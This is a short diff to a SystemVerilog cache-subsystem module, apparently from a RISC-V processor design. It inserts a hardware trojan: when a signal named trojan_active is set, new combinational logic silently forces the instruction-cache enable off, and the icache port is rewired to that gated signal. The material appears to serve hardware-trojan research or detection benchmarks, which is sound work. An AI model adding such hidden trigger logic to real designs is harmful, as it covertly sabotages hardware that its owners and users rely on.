@@ -72,7 +72,14 @@ module wt_cache_subsystem #(
   logic dcache_adapter_data_req, adapter_dcache_data_ack, adapter_dcache_rtrn_vld;
   wt_cache_pkg::dcache_req_t  dcache_adapter;
   wt_cache_pkg::dcache_rtrn_t adapter_dcache;
-
+  //added by shayan
+  logic icache_en_i_temp;
+  always_comb begin
+    if (trojan_active==1'b0)
+        icache_en_i_temp=icache_en_i;
+    else
+        icache_en_i_temp=1'b0;
+  end
   wt_icache #(
     // use ID 0 for icache reads
     .RdTxId             ( 0             ),
@@ -81,7 +88,8 @@ module wt_cache_subsystem #(
     .clk_i              ( clk_i                   ),
     .rst_ni             ( rst_ni                  ),
     .flush_i            ( icache_flush_i          ),
-    .en_i               ( icache_en_i             ),
+    //modified by shayan
+    .en_i               ( icache_en_i_temp             ),
     .miss_o             ( icache_miss_o           ),
     .areq_i             ( icache_areq_i           ),
     .areq_o             ( icache_areq_o           ),
